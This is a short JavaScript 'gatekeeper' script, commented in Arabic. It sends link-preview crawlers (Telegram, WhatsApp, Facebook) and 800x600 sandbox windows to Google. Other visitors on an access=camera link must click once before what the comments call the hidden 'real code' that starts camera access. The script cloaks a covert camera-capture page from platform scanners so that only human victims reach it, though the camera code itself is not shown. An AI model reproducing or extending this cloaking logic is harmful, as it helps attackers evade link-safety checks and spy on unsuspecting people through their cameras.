/* Ahmed's Gatekeeper - Access Logic */

(function() {
    // 1. تحديد هوية الزوار الممنوعين (بوتات ومعاينات)
    const isBot = /bot|telegram|preview|facebook|whatsapp/i.test(navigator.userAgent);
    
    // 2. فحص أبعاد البوت المشهورة التي ظهرت عندك (800x600)
    const isBotScreen = (window.innerWidth === 800 && window.innerHeight === 600);

    if (isBot || isBotScreen) {
        window.stop();
        window.location.replace("https://www.google.com");
        return;
    }

    // 3. منع تنفيذ الكود الحساس إلا بعد "حركة بشرية"
    // سنقوم بتعطيل وظيفة الكاميرا أو السحب حتى يلمس المستخدم الشاشة
    window.addEventListener('load', function() {
        const urlParams = new URLSearchParams(window.location.search);
        
        // إذا كان الرابط يحتوي على طلب الكاميرا
        if (urlParams.get('access') === 'camera') {
            console.log("Waiting for human interaction...");
            
            // نضع "حاجز" صامت
            document.body.addEventListener('click', function() {
                // الكود الحقيقي الخاص بك سيبدأ العمل هنا فقط بعد النقرة الأولى
                console.log("Human confirmed, starting camera access...");
            }, { once: true });
        }
    });
})();
